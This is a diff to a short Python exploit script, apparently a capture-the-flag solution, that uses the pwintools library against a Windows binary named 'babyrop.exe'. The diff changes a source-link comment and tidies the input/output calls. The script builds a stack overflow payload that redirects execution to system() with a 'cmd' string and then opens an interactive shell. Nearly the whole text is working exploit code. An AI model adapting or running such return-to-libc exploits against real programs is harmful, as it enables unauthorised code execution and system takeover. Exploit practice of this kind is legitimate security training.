@@ -1,4 +1,4 @@
-# https://github.com/masthoon/pwintools
+# https://gist.github.com/bash-c/6c178705bb4cca51d43a048feb62f395#file-pwintools-py
 from pwintools import *
 
 io = process("babyrop.exe")
@@ -17,11 +17,11 @@ cmd = mscvr_base + 0x1ed0
 print("cmd -> {:#x}".format(cmd))
 
 payload = "0" * 0xcc + 'aaaa' + p32(system) + 'cccc' + p32(cmd)
-io.recvuntil("length")
-io.sendline(str(len(payload) + 10))
+
+io.sendlineafter("length", str(len(payload) + 10))
 
 raw_input("DEBUG: ")
 io.sendline(payload)
-io.send("\n")
+io.sendline()
 
 io.interactive()
